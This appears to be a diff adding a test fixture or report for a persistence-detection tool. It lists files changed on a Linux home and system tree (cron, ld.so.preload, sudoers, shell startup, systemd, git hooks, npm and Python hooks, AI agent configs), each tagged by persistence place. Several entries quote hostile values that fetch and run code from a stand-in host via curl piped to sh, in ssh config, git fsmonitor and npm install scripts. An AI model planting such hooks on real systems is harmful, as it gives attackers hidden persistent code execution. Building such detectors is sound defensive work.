@@ -1,0 +1,41 @@
+{"path": "etc/cron.d/sync", "change": "new", "place": "scheduled", "why": "place"}
+{"path": "etc/ld.so.preload", "change": "new", "place": "loaded-into-programs", "why": "place"}
+{"path": "etc/profile.d/zz-tools.sh", "change": "new", "place": "shell-startup", "why": "place"}
+{"path": "etc/sudoers.d/u", "change": "new", "place": "power", "why": "place"}
+{"path": "home/u/.bash_profile", "change": "new", "place": "shell-startup", "why": "place"}
+{"path": "home/u/.bashrc", "change": "changed", "place": "shell-startup", "why": "place"}
+{"path": "home/u/.claude/settings.json", "change": "changed", "place": "agents", "why": "place"}
+{"path": "home/u/.codex/config.toml", "change": "changed", "place": "agents", "why": "place"}
+{"path": "home/u/.config/autostart/sync.desktop", "change": "new", "place": "services", "why": "place"}
+{"path": "home/u/.config/git/hooks/pre-push", "change": "new", "place": "git", "why": "place"}
+{"path": "home/u/.config/systemd/user/default.target.wants/postgresql.service", "change": "new", "place": "services", "why": "place"}
+{"path": "home/u/.config/systemd/user/default.target.wants/sync.service", "change": "new", "place": "services", "why": "place"}
+{"path": "home/u/.config/systemd/user/postgresql.service", "change": "new", "place": "services", "why": "place"}
+{"path": "home/u/.config/systemd/user/sync.service", "change": "new", "place": "services", "why": "place"}
+{"path": "home/u/.config/systemd/user/sync.timer", "change": "new", "place": "services", "why": "place"}
+{"path": "home/u/.config/systemd/user/timers.target.wants/sync.timer", "change": "new", "place": "services", "why": "place"}
+{"path": "home/u/.gitconfig", "change": "changed", "place": "git", "why": "key: hooksPath = ~/.config/git/hooks"}
+{"path": "home/u/.local/bin/git", "change": "new", "place": "loaded-into-programs", "why": "place"}
+{"path": "home/u/.npmrc", "change": "new", "place": "packages", "why": "key: node-options=--require ~/.cache/.n/hook.js"}
+{"path": "home/u/.ssh/authorized_keys", "change": "changed", "place": "power", "why": "place"}
+{"path": "home/u/.ssh/config", "change": "changed", "place": "ssh-client", "why": "key: PermitLocalCommand yes | LocalCommand sh -c 'curl -s https://paste.example/x|sh'"}
+{"path": "home/u/.venv/lib/python3.12/site-packages/__editable__.app-0.1.pth", "change": "new", "place": "loaded-into-programs", "why": "place"}
+{"path": "home/u/.venv/lib/python3.12/site-packages/sitecustomize.py", "change": "new", "place": "loaded-into-programs", "why": "place"}
+{"path": "home/u/.venv/lib/python3.12/site-packages/zz_sync.pth", "change": "new", "place": "loaded-into-programs", "why": "place"}
+{"path": "home/u/.zshenv", "change": "new", "place": "shell-startup", "why": "place"}
+{"path": "home/u/work/app/.envrc", "change": "new", "place": "editors-and-folders", "why": "place"}
+{"path": "home/u/work/app/.git/config", "change": "changed", "place": "git", "why": "key: hooksPath = .husky | fsmonitor = \"sh -c 'curl -s https://paste.example/x | sh' #\""}
+{"path": "home/u/work/app/.git/hooks/post-checkout", "change": "new", "place": "git", "why": "place"}
+{"path": "home/u/work/app/.husky/pre-commit", "change": "new", "place": "git", "why": "in a folder core.hooksPath names"}
+{"path": "home/u/work/app/.vscode/tasks.json", "change": "new", "place": "editors-and-folders", "why": "place"}
+{"path": "home/u/work/app/AGENTS.md", "change": "new", "place": "agents", "why": "place"}
+{"path": "home/u/work/app/node_modules/dep42/package.json", "change": "changed", "place": "packages", "why": "key: {\"name\": \"dep42\", \"version\": \"1.0.0\", \"scripts\": {\"install\": \"curl -s https://paste.example/x | sh\"}}"}
+{"path": "home/u/work/app/node_modules/newdep3/package.json", "change": "new", "place": "packages", "why": "key: {\"name\": \"newdep3\", \"version\": \"2.0.0\", \"scripts\": {\"postinstall\": \"node install.js\"}}"}
+{"path": "home/u/work/app/node_modules/newdep77/package.json", "change": "new", "place": "packages", "why": "key: {\"name\": \"newdep77\", \"version\": \"2.0.0\", \"scripts\": {\"postinstall\": \"node install.js\"}}"}
+{"path": "home/u/work/app/package.json", "change": "changed", "place": "packages", "why": "key: \"postinstall\": \"curl -s https://paste.example/x | sh\""}
+{"path": "var/spool/at/a0001", "change": "new", "place": "scheduled", "why": "place"}
+{"path": "var/spool/cron/crontabs/u", "change": "new", "place": "scheduled", "why": "place"}
+{"path": "usr/local/lib/libsync.so", "change": "new", "place": "loaded-into-programs", "why": "named by etc/ld.so.preload"}
+{"path": "home/u/.cache/.s/keep.sh", "change": "new", "place": "shell-startup", "why": "named by home/u/.bashrc"}
+{"path": "home/u/.config/git/hooks", "change": "new", "place": "git", "why": "named by home/u/.gitconfig"}
+{"path": "home/u/.cache/.n/hook.js", "change": "new", "place": "packages", "why": "named by home/u/.npmrc"}
